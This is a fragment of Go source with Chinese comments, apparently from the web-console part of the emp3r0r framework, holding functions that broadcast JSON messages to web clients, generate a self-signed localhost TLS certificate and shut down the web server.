// BroadcastToWebClients 广播消息到所有 Web 客户端
func BroadcastToWebClients(msgType string, data interface{}) {
	msg := WebMessage{
		Type:      msgType,
		Data:      data,
		Timestamp: time.Now().Format(time.RFC3339),
	}
	if data, err := json.Marshal(msg); err == nil {
		select {
		case broadcastChan <- data:
		default:
			logging.Warningf("Broadcast channel full, dropping message")
		}
	}
}

// generateSelfSignedCert 生成自签名证书
func generateSelfSignedCert(certFile, keyFile string) error {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"emp3r0r"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(time.Hour * 24 * 365),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("0.0.0.0")},
		DNSNames:              []string{"localhost", "*.localhost"},
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	certOut, err := os.Create(certFile)
	if err != nil {
		return fmt.Errorf("failed to create cert file: %v", err)
	}
	defer certOut.Close()
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})

	keyOut, err := os.Create(keyFile)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}
	defer keyOut.Close()

	keyBytes, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return fmt.Errorf("failed to marshal key: %v", err)
	}
	pem.Encode(keyOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes})

	return nil
}

// StopWebServer 停止 Web 服务器
func StopWebServer() {
	if WebServerCancel != nil {
		WebServerCancel()
	}
	if WebServer != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		WebServer.Shutdown(ctx)
	}
}
